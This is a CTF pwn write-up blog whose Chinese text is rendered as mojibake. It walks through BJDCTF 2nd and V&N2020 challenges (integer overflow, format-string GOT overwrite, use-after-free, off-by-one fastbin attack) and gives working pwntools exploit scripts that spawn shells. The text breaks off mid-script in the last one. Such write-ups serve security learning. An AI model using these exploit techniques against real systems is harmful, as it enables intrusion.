<h2 id="BJDCTF-2nd-r2t3-integer-overflow-ret2text"><a href="#BJDCTF-2nd-r2t3-integer-overflow-ret2text" class="headerlink" title="[BJDCTF 2nd]r2t3 - integer overflow + ret2text"></a>[BJDCTF 2nd]r2t3 - integer overflow + ret2text</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/09/18/KoFCaQM71JZzNgA.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p>ä¸»å‡½æ•°ä¸­è¯»å…¥æœ€å¤§0x400ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯å¼€è¾Ÿäº†0x408å­—èŠ‚çš„ç©ºé—´ï¼Œæ— æ³•æº¢å‡º</p>
<p><img src="https://i.loli.net/2020/10/07/usMxPdgyVGUtAEB.png" alt="image.png"></p>
<p>åŒæ—¶ä¸»å‡½æ•°ä¼šå°†è¾“å…¥ä¼ å…¥<code>name_check()</code>å‡½æ•°ä¸­ï¼Œè‹¥é€šè¿‡<code>strlen()</code>è®¡ç®—å‡ºæ¥çš„é•¿åº¦åœ¨4~8ä¸ªå­—èŠ‚ä¹‹é—´åˆ™ä¼šå°†æˆ‘ä»¬çš„è¾“å…¥é€šè¿‡<code>strcpy()</code>æ‹·è´è‡³<code>dest</code>ä¸Šï¼Œè€Œè¿™é‡Œåˆ°ebpä¹‹é—´åªæœ‰<code>0x11</code>ä¸ªå­—èŠ‚çš„ç©ºé—´ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥é€šè¿‡è¿™æ®µä»£ç è¦†ç›–æ‰è¯¥å‡½æ•°çš„è¿”å›åœ°å€</p>
<p><img src="https://i.loli.net/2020/09/18/GlzDVrQKSOiykoN.png" alt="image.png"></p>
<p>åŒæ—¶æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿåˆ°å­˜åœ¨å¯ä»¥ç›´æ¥getshellçš„åé—¨å‡½æ•°</p>
<p><img src="https://i.loli.net/2020/09/18/QNlFfbPJyCDL9I5.png" alt="image.png"></p>
<p>è€ƒè™‘åˆ°åœ¨<code>name_check()</code>å‡½æ•°ä¸­ç”¨æ¥å­˜æ”¾è¾“å…¥é•¿åº¦çš„å˜é‡ä¸º8ä½æ— ç¬¦å·æ•´å‹ï¼ŒèŒƒå›´ä¸º0~255ï¼Œæ•…æˆ‘ä»¬åªéœ€è¦è¾“å…¥260ä¸ªå­—èŠ‚ä¾¿å¯ä»¥å‘ç”Ÿä¸Šæº¢é™ä½¿è¯¥å˜é‡çš„å€¼ä¸Šæº¢ä¸º4ï¼Œç»•è¿‡åˆ¤å®š</p>
<p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x11</span> + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0x804858b</span>) + <span class="string">b&#x27;A&#x27;</span> * (<span class="number">260</span> - <span class="number">4</span> - <span class="number">4</span> - <span class="number">0x11</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./r2t3&#x27;</span>)<span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,25595)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>å‘é€payloadå³å¯getshell</p>
<p><img src="https://i.loli.net/2020/09/18/XmBDE6Lk8UHlN1R.png" alt="image.png"></p>
<h2 id="BJDCTF-2nd-one-gadget-one-gadget"><a href="#BJDCTF-2nd-one-gadget-one-gadget" class="headerlink" title="[BJDCTF 2nd]one_gadget - one_gadget"></a>[BJDCTF 2nd]one_gadget - one_gadget</h2><blockquote>
<p> é¦–å…ˆä»é¢˜ç›®åå­—æˆ‘ä»¬å°±å¯ä»¥çœ‹å‡ºè¿™é“é¢˜åº”è¯¥éœ€è¦æˆ‘ä»¬ç”¨åˆ°ä¸€ä¸ªå·¥å…·â€”â€”<a target="_blank" rel="noopener" href="https://github.com/david942j/one_gadget">one_gadget</a></p>
<p> ä»€ä¹ˆæ˜¯one_gadgetï¼Ÿå³åœ¨libcä¸­å­˜åœ¨ç€çš„å¯ä»¥ç›´æ¥getshellçš„gadget</p>
</blockquote>
<p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°<strong>ä¿  æŠ¤  å…¨  å¼€</strong>ï¼ˆ<strong>å¿ƒ è‚º åœ æ­¢</strong></p>
<p><img src="https://i.loli.net/2020/09/20/LrGYDRVBwkmJ49K.png" alt="image.png"></p>
<p>æ‹–è¿›IDAé‡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/09/20/sh7PJmrCWN2fRBv.png" alt="image.png"></p>
<p>ä¸»å‡½æ•°ä¼šè¯»å…¥ä¸€ä¸ªæ•´æ•°åˆ°<strong>å‡½æ•°æŒ‡é’ˆ</strong>v4ä¸­ï¼Œå¹¶å°è¯•æ‰§è¡Œ<code>v4()</code>ï¼Œæ•…æˆ‘ä»¬åªéœ€è¦è¾“å…¥<strong>one_gadget</strong>çš„åœ°å€å³å¯getshell</p>
<p>ä½¿ç”¨<code>one_gadget</code>å·¥å…·å¯ä»¥æ‰¾å‡ºlibcä¸­çš„getshell gadget</p>
<blockquote>
<p>ä¸æ˜åŸå› åœ¨archä¸Šä¸€ç›´æ²¡æ³•è¿è¡Œï¼Œåªå¥½åˆ‡åˆ°Ubuntu</p>
</blockquote>
<p><img src="https://i.loli.net/2020/09/20/I5t8xJdkwloaGeA.png" alt="image.png"></p>
<p>ä½†æ˜¯æˆ‘ä»¬è¿˜éœ€è¦çŸ¥é“libcçš„åŸºå€</p>
<p>æˆ‘ä»¬å¯ä»¥å‘ç°åœ¨<code>init()</code>å‡½æ•°ä¸­ä¼šè¾“å‡º<code>printf()</code>å‡½æ•°çš„åœ°å€ï¼Œæœ‰äº†è¿™ä¸ªæˆ‘ä»¬ä¾¿å¯ä»¥è®¡ç®—å‡ºlibcçš„åŸºå€ï¼Œä¹Ÿå°±æœ‰äº†one_gadgetçš„çœŸå®åœ°å€</p>
<p>è€Œé¢˜ç›®ä¹Ÿç»™äº†æˆ‘ä»¬libcï¼Œæ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">one_gadget = <span class="number">0xe237f</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./one_gadget&#x27;</span>)<span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,27792)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./one_gadget&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.29.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;here is the gift for u:&#x27;</span>)</span><br><span class="line">printf_addr = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = printf_addr - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">getshell = libc_base + one_gadget</span><br><span class="line">p.sendline(<span class="built_in">str</span>(getshell))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="BJDCTF-2nd-r2t4-fmtstr"><a href="#BJDCTF-2nd-r2t4-fmtstr" class="headerlink" title="[BJDCTF 2nd]r2t4 - fmtstr"></a>[BJDCTF 2nd]r2t4 - fmtstr</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå¼€äº†NXå’Œcanary</p>
<p><img src="https://i.loli.net/2020/12/01/zPCHqKLigBI4Nwd.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/12/01/W6sVY2Hp4TFECBO.png" alt="image.png"></p>
<p>mainä¸­å­˜åœ¨æº¢å‡ºï¼Œä¸”å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p>
<p><img src="https://i.loli.net/2020/12/01/jIJCdMwZ9ufy3ti.png" alt="image.png"></p>
<p>å­˜åœ¨å¯ä»¥è¯»å–flagçš„åé—¨å‡½æ•°</p>
<p>ç®€å•å°è¯•å¯ä»¥å‘ç°æ ¼å¼åŒ–å­—ç¬¦ä¸²æ˜¯ä½äºæ ˆä¸Šçš„ç¬¬å…­ä¸ªå‚æ•°</p>
<p><img src="https://i.loli.net/2020/12/01/eI31RvsilqYKpTZ.png" alt="image.png"></p>
<p>æ•…è€ƒè™‘åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²è¿›è¡Œä»»æ„åœ°å€å†™åŠ«æŒgotè¡¨ä¸­çš„__stack_chk_failä¸ºåé—¨å‡½æ•°åœ°å€å³å¯</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯<code>printf</code>å‡½æ•°é‡åˆ°<code>\x00</code>ä¼šå‘ç”Ÿæˆªæ–­ï¼Œæ•…ä¸èƒ½ç›´æ¥ä½¿ç”¨fmtstr_payloadï¼Œè€Œæ˜¯è¦ç”¨æ‰‹å†™çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ä¸ºäº†é˜²æ­¢è¾“å‡ºè¿‡é•¿è€Œå¡é¡¿ï¼Œæˆ‘ä»¬æœ€å¥½åˆ†å¤šæ¬¡å†™ï¼Œè¿™é‡Œåˆ†äº†ä¸¤æ¬¡çš„äºŒå­—èŠ‚å†™</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./r2t4&#x27;</span>)<span class="comment">#remote(&#x27;node3.buuoj.cn&#x27;,25635)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./r2t4&#x27;</span>)</span><br><span class="line">backdoor = <span class="number">0x400626</span></span><br><span class="line">payload = <span class="string">b&#x27;%64c%9$hn%1510c%10$hnaaa&#x27;</span> + p64(e.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]+<span class="number">2</span>) + p64(e.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>])<span class="comment">#fmtstr_payload(6,&#123;e.got[&#x27;__stack_chk_fail&#x27;]:backdoor&#125;)</span></span><br><span class="line">payload.ljust(<span class="number">100</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è·å¾—flag</p>
<p><img src="https://i.loli.net/2020/12/01/3KvIRtcrT1z9LUm.png" alt="image.png"></p>
<blockquote>
<h3 id="åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ„é€ ä»»æ„åœ°å€å†™"><a href="#åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ„é€ ä»»æ„åœ°å€å†™" class="headerlink" title="åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ„é€ ä»»æ„åœ°å€å†™"></a>åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ„é€ ä»»æ„åœ°å€å†™</h3><p>è¿™é‡Œç®€å•è¯´ä¸€ä¸‹æ ¼å¼åŒ–å­—ç¬¦ä¸²è¿›è¡Œä»»æ„åœ°å€å†™çš„æ„é€ ï¼Œä¸»è¦åˆ©ç”¨ <code>%n</code> è¿™ä¸€ä¸ªç‰¹æ®Šçš„å‚æ•°ï¼š ä¸è¾“å‡ºå­—ç¬¦ï¼Œä½†æ˜¯æŠŠå·²ç»æˆåŠŸè¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°å†™å…¥å¯¹åº”çš„æ•´å‹æŒ‡é’ˆå‚æ•°æ‰€æŒ‡çš„å˜é‡ï¼ˆæ‘˜è‡ªwikipediaï¼‰</p>
<p>æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ ¼å¼å¦‚ä¸‹ï¼š</p>
<p><code>%[*parameter*][*flags*][*field width*][.*precision*][*length*]*type*</code></p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ç›´æ¥æŒ‡å®š <code>field width</code> çš„å€¼å¡«å……è¾“å‡ºçš„é•¿åº¦ï¼Œåç»­åªéœ€è¦åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç›¸åº”ä½ç½®æ”¾ä¸Šç›¸åº”æŒ‡é’ˆå‚æ•°å³å¯</p>
<p>ä¾‹ï¼š</p>
<ul>
<li><code>%64c%9$hhn</code>ï¼šåœ¨æ ˆä¸Šç¬¬ä¹ä¸ªå‚æ•°æŒ‡å‘çš„ä½ç½®å†™ä¸Š <code>0x40</code>ï¼ˆå†™çš„èŒƒå›´ï¼šcharç­‰åŒé•¿åº¦ï¼‰</li>
<li><code>%64c%9$hn</code>ï¼šåœ¨æ ˆä¸Šç¬¬ä¹ä¸ªå‚æ•°æŒ‡å‘çš„ä½ç½®å†™ä¸Š <code>0x40</code>ï¼ˆå†™çš„èŒƒå›´ï¼šshortç­‰åŒé•¿åº¦ï¼‰</li>
</ul>
<p>å‚ç…§å¸¸è§„çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²å³å¯</p>
</blockquote>
<h2 id="BJDCTF-2nd-test-LinuxåŸºç¡€çŸ¥è¯†"><a href="#BJDCTF-2nd-test-LinuxåŸºç¡€çŸ¥è¯†" class="headerlink" title="[BJDCTF 2nd]test - LinuxåŸºç¡€çŸ¥è¯†"></a>[BJDCTF 2nd]test - LinuxåŸºç¡€çŸ¥è¯†</h2><p>é¢˜ç›®åªç»™äº†ä¸€ä¸ªsshï¼Œå°è¯•è¿›è¡Œè¿æ¥</p>
<p><img src="https://i.loli.net/2020/12/01/WqAa8StsGKveMTw.png" alt="image.png"></p>
<p>å°è¯•ä¸€ä¸‹å‘ç°æˆ‘ä»¬æ— æ³•ç›´æ¥è·å¾—flag</p>
<p><img src="https://i.loli.net/2020/12/01/BsjidqO7gZcCfEv.png" alt="image.png"></p>
<p>æŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶æƒé™ï¼Œå‘ç°åªæœ‰<code>ctf_pwn</code>ç”¨æˆ·ç»„æ‰æœ‰æƒé™</p>
<p><img src="https://i.loli.net/2020/12/01/ETx7LSG5zC9Zeul.png" alt="image.png"></p>
<p>æç¤ºå‘Šè¯‰æˆ‘ä»¬æœ‰ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶testä¸å…¶æºç ï¼Œå°è¯•é˜…è¯»</p>
<p><img src="https://i.loli.net/2020/12/01/g7qk6h8j2BM4Y3T.png" alt="image.png"></p>
<p>è¯¥ç¨‹åºä¼šå°†æˆ‘ä»¬çš„è¾“å…¥ä½œä¸ºå‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯ä¼šè¿‡æ»¤ä¸€éƒ¨åˆ†å­—ç¬¦</p>
<p>å°è¯•ä½¿ç”¨å¦‚ä¸‹æŒ‡ä»¤æŸ¥çœ‹å‰©ä½™çš„å¯ç”¨å‘½ä»¤</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`$ ls /usr/bin/ /bin/ | grep -v -E &quot;n|e|p|b|u|s|h|i|f|l|a|g&quot;`</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/12/01/2zWulrZ5IOGcELP.png" alt="image.png"></p>
<p>æˆ‘ä»¬å‘ç°åœ¨testç¨‹åºä¸­æœ‰æ•ˆç”¨æˆ·ç»„ä¸º<code>ctf_pwn</code>ï¼Œæ•…ä½¿ç”¨è¯¥ç¨‹åºè·å–ä¸€ä¸ªshellå³å¯è·å¾—flag</p>
<p><img src="https://i.loli.net/2020/12/01/r4U1m3TiBjohkZF.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2020/12/01/j8LHM4DzXE6pZ5m.png" alt="image.png"></p>
<h2 id="BJDCTF-2nd-ydsneedgirlfriend2-overwrite"><a href="#BJDCTF-2nd-ydsneedgirlfriend2-overwrite" class="headerlink" title="[BJDCTF 2nd]ydsneedgirlfriend2 - overwrite"></a>[BJDCTF 2nd]ydsneedgirlfriend2 - overwrite</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå¼€äº†NXå’Œcanary</p>
<p><img src="https://i.loli.net/2020/12/01/mDEwn7F62VP9klh.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/12/01/AbWlLCKU6Sdxn5D.png" alt="image.png"></p>
<p>çœ‹èµ·æ¥æ˜¯ä¸€é“å †é¢˜ï¼Œå­˜åœ¨åˆ†é…ã€é‡Šæ”¾ã€æ‰“å°å †å—çš„åŠŸèƒ½</p>
<p>åŒæ—¶æˆ‘ä»¬å¯ä»¥å‘ç°ç¨‹åºä¸­å­˜åœ¨åé—¨å‡½æ•°</p>
<p><img src="https://i.loli.net/2020/12/01/Ym2n6FaAwBNOuV7.png" alt="image.png"></p>
<p>é¢˜ç›®æç¤ºæ˜¯Ubuntu18ï¼Œä¹Ÿå°±æ˜¯libc2.27ï¼Œå¼•å…¥äº†tcacheæœºåˆ¶ï¼Œä½†æ˜¯æ²¡æœ‰tcache double freeéªŒè¯çš„ç‰ˆæœ¬</p>
<p>addå‡½æ•°ä¸­ä¼¼ä¹åªèƒ½åˆ†é…7ä¸ªå †å—ï¼Œç©ºé—´æœ‰ç‚¹ç´§å¼ ï¼Œè€Œä¸”æ¯æ¬¡åˆ†é…åéƒ½ä¼šè¦†ç›–æ‰åŸæ¥çš„å †å—æŒ‡é’ˆ</p>
<p><img src="https://i.loli.net/2020/12/01/E5oFjm9cVOnTGXv.png" alt="image.png"></p>
<p>å¥½åœ¨freeåæœªå°†æŒ‡é’ˆç½®0ï¼Œ<strong>å­˜åœ¨Use After Free</strong>æ¼æ´</p>
<p><img src="https://i.loli.net/2020/12/01/yDu6BFCNoMLItQd.png" alt="image.png"></p>
<p>åŒæ—¶æˆ‘ä»¬å¯ä»¥å‘ç°<code>show()</code>å‡½æ•°ä¸­è°ƒç”¨çš„æ˜¯girlfriend[0][1]ä¸­çš„æ•°æ®ä½œä¸ºå‡½æ•°æŒ‡é’ˆæ¥æ‰§è¡Œï¼Œè€Œ<strong>girlfriend</strong>æœ¬èº«å°±æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œåœ¨åˆå§‹æ—¶åˆ†é…çš„æ˜¯0x10å¤§å°çš„å †å—</p>
<p><img src="https://i.loli.net/2020/12/01/Tk48oH5yF7NPvrp.png" alt="image.png"></p>
<p>æ•…æˆ‘ä»¬åªéœ€è¦åˆå§‹åŒ–girlfriendåfreeæ‰girlfriendå†é‡æ–°åˆ†é…ä¸€ä¸ª0x10å¤§å°çš„å †å—å³å¯æ”¹å†™è¯¥æŒ‡é’ˆä¸ºåé—¨å‡½æ•°åœ°å€åå†showå³å¯getshell</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./girlfriend&#x27;</span>) <span class="comment"># remote(&#x27;node3.buuoj.cn&#x27;,27506)</span></span><br><span class="line">backdoor = <span class="number">0x400D86</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;u choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input the length of her name:&quot;</span>)</span><br><span class="line">    p.send(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please tell me her name:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">&quot;arttnba3&quot;</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x10</span>, p64(<span class="number">0</span>) + p64(backdoor))</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯getshell</p>
<p><img src="https://i.loli.net/2020/12/01/QHNE6DmMORUiGcF.png" alt="image.png"></p>
<h1 id="V-amp-N2020-å…¬å¼€èµ›-Pwn"><a href="#V-amp-N2020-å…¬å¼€èµ›-Pwn" class="headerlink" title="V&amp;N2020 å…¬å¼€èµ› - Pwn"></a>V&amp;N2020 å…¬å¼€èµ› - Pwn</h1><h2 id="V-amp-N2020-å…¬å¼€èµ›-simpleHeap-off-by-one-fastbin-attack-one-gadget"><a href="#V-amp-N2020-å…¬å¼€èµ›-simpleHeap-off-by-one-fastbin-attack-one-gadget" class="headerlink" title="[V&amp;N2020 å…¬å¼€èµ›]simpleHeap - off by one + fastbin attack + one_gadget"></a>[V&amp;N2020 å…¬å¼€èµ›]simpleHeap - off by one + fastbin attack + one_gadget</h2><p>åˆæ˜¯ä¸€é“å †é¢˜æ¥äº†ï¼Œä¸å‡ºæ‰€æ–™ï¼Œä¿  æŠ¤  å…¨  å¼€</p>
<p><img src="https://i.loli.net/2020/12/01/iyIftbNOM4CrTka.png" alt="image.png"></p>
<p>åŒæ—¶é¢˜ç›®æç¤ºUbuntu16ï¼Œä¹Ÿå°±æ˜¯è¯´æ²¡æœ‰tcache</p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/12/01/IWHrRozGqyLDfUX.png" alt="image.png"></p>
<p>è¿™æ˜¯ä¸€é“æœ‰ç€åˆ†é…ã€æ‰“å°ã€é‡Šæ”¾ã€ç¼–è¾‘å †å—çš„åŠŸèƒ½çš„å †é¢˜ï¼Œä¸éš¾çœ‹å‡ºæˆ‘ä»¬åªèƒ½åˆ†é…10ä¸ªå †å—ï¼Œä¸è¿‡æ²¡æœ‰tcacheçš„æƒ…å†µä¸‹ï¼Œç©ºé—´å…¶å®è¿˜æ˜¯æŒºå……è¶³çš„                                                                                                                   </p>
<p>æ¼æ´ç‚¹åœ¨editå‡½æ•°ä¸­ï¼Œ<strong>ä¼šå¤šè¯»å…¥ä¸€ä¸ªå­—èŠ‚ï¼Œå­˜åœ¨off by oneæ¼æ´</strong>ï¼Œåˆ©ç”¨è¿™ä¸ªæ¼æ´æˆ‘ä»¬å¯ä»¥<strong>ä¿®æ”¹ä¸€ä¸ªå †å—çš„ç‰©ç†ç›¸é‚»çš„ä¸‹ä¸€ä¸ªå †å—çš„size</strong></p>
<p><img src="https://i.loli.net/2020/12/01/o9PlK4ECbHuFiN6.png" alt="image.png"></p>
<p>ç”±äºé¢˜ç›®æœ¬èº«ä»…å…è®¸åˆ†é…å¤§å°å°äº111çš„chunkï¼Œè€Œè¿›å…¥unsorted binéœ€è¦malloc(0x80)çš„chunkï¼Œæ•…æˆ‘ä»¬è¿˜æ˜¯è€ƒè™‘åˆ©ç”¨off by oneçš„æ¼æ´æ”¹å¤§ä¸€ä¸ªchunkçš„sizeé€å…¥unsorted binååˆ†å‰²é€ æˆoverlappingçš„æ–¹å¼è·å¾—libcçš„åœ°å€</p>
<p><img src="https://i.loli.net/2020/12/03/mh1HLy7cvGrCUAQ.png" alt="image.png"></p>
<p>å› ä¸ºåˆšå¥½fastbin attackæ‰€ç”¨çš„chunkçš„sizeä¸º0x71ï¼Œæ•…æˆ‘ä»¬å°†è¿™ä¸ªå¤§chunkçš„sizeæ”¹ä¸º<code> 0x70 + 0x70 + 1 = 0xe1</code>å³å¯</p>
<p>ä¼ ç»Ÿæ€è·¯æ˜¯å°†__malloc_hookæ”¹ä¸ºone_gadgetä»¥getshellï¼Œä½†æ˜¯ç›´æ¥å°è¯•æˆ‘ä»¬ä¼šå‘ç°æ ¹æœ¬æ— æ³•getshell</p>
<p><img src="https://i.loli.net/2020/12/03/RXyTELuGiqKCSh7.png" alt="image.png"></p>
<p>è¿™æ˜¯å› ä¸ºone_gadgetå¹¶éä»»ä½•æ—¶å€™éƒ½æ˜¯é€šç”¨çš„ï¼Œéƒ½æœ‰ä¸€å®šçš„å…ˆå†³æ¡ä»¶ï¼Œè€Œå½“å‰çš„ç¯å¢ƒåˆšå¥½ä¸æ»¡è¶³one_gadgetçš„ç¯å¢ƒ</p>
<p><img src="https://i.loli.net/2020/12/03/DlinxIM76eTLu8S.png" alt="image.png"></p>
<p>é‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨reallocå‡½æ•°ä¸­çš„gadgetæ¥è¿›è¡Œå‹æ ˆç­‰æ“ä½œæ¥æ»¡è¶³one_gadgetçš„è¦æ±‚ï¼Œè¯¥æ®µgadgetæ‰§è¡Œå®Œæ¯•åä¼šè·³è½¬è‡³__realloc_hookï¼ˆè‹¥ä¸ä¸ºNULLï¼‰</p>
<p><img src="https://i.loli.net/2020/12/03/PNyq3WFTU8mtYSM.png" alt="image.png"></p>
<p>è€Œ__realloc_hookå’Œ__malloc_hookåˆšå¥½æ˜¯æŒ¨ç€çš„ï¼Œæˆ‘ä»¬åœ¨fastbin attackæ—¶å¯ä»¥ä¸€å¹¶ä¿®æ”¹</p>
<p><img src="https://i.loli.net/2020/12/03/AG3oW65aVeCzMgt.png" alt="image.png"></p>
<p>æ•…è€ƒè™‘ä¿®æ”¹__malloc_hookè·³è½¬è‡³reallocå‡½æ•°å¼€å¤´çš„gadgetè°ƒæ•´å †æ ˆï¼Œä¿®æ”¹__realloc_hookä¸ºone_gadgetå³å¯getshell</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 